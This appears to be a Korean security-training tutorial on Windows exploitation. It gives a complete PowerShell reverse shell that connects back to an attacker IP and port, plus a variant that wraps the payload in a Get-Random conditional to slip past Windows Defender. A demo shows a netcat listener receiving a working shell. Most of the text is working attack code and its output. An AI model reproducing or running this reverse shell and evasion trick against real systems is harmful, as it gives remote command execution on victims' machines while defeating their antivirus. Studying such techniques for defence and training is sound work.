Windows 환경 - Exploit Technique :
    윈도우 환경의 리버스 쉘 스크립트는, 온라인에서 쉽게 구할 수 있습니다.
    (https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

    하지만 해당 스크립트를 사용해보면 아래와 같이 윈도우 디펜더에 의해 차단되는 것을 확인할 수 있습니다.
    ex)
        PS C:\Users\dreamhack> $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);
        $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()};$client.Close()
        At line:1 char:1
        + $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$ ...
        + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        This script contains malicious content and has been blocked by your antivirus software.
            + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
            + FullyQualifiedErrorId : ScriptContainedMaliciousContent

    이를 우회하기 위해 윈도우 파워쉘 환경에서 제공하는 함수를 사용합니다.
    ex)
        $client = New-Object System.Net.Sockets.TCPClient("123.123.124.124",1234);
        $x = Get-Random;
        if ($x -ge 1) {
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535|%{0};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                $sendback = (iex $data 2>&1 | Out-String );
                $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush()
            };
            $client.Close();
        } else {
            $client.Close();
        }

        Line 2~3: Get-Random 함수를 이용해 랜덤 넘버를 생성한 후 해당 값이 1보다 큰 값인지 확인하고 리버스 쉘 코드를 실행합니다.

        윈도우 디펜더에서는 해당 조건문이 함수 실행 결과에 영향을 받는 것으로 인식해 검사를 우회할 수 있습니다.

Demo :
    ex)
        PS C:\Users\dreamhack> powershell
        Windows PowerShell
        Copyright (C) Microsoft Corporation. All rights reserved.
        Try the new cross-platform PowerShell https://aka.ms/pscore6
        PS C:\Users\dreamhack> $client = New-Object System.Net.Sockets.TCPClient("123.123.124.124",1234);
        $x=Get-Random;if ($x -ge 1) { $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
        $client.Close(); } else { $client.Close(); }

    파워쉘 터미널에서 실행을 해 보면 정상적으로 리버스 쉘이 동작한 것을 확인할 수 있습니다.
    ex)
        $ nc -lvp 1234
        Listening on [0.0.0.0] (family 0, port 1234)
        Connection from 123.123.123.123 63187 received!
        PS C:\Users\dreamhack> whoami
        dreamhack\dreamhack


























